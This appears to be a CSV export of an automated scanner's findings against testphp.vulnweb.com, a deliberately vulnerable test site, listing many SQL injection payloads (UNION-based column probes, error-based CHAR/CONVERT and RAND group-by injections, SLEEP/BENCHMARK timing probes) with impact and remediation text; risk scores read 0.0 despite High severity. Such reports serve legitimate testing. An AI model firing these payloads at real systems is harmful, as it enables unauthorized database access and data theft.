Type,Severity,Risk Score,URL/Location,Payload,Impact,Remediation
SQL Injection,High,0.0,Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX'),UNION ALL SELECT 'INJ'||'ECT'||'XXX',"Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113))))","AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--)","UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--)","UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a))","AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#)","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--)","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--)","UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#)","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX'--),UNION ALL SELECT 'INJ'||'ECT'||'XXX'--,"Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11--)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11--","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
SQL Injection,High,0.0,"Parameter: id (in URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--)","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--","Likely Generic SQL database vulnerability. An attacker could bypass authentication, access, modify, or delete data within the entire database structure, and potentially gain administrative rights over the database server.",Ensure all inputs interacting with the Generic SQL database are sanitized. Use prepared statements (Parameterized Queries) heavily. Enforce Least Privilege principles on the database user account.
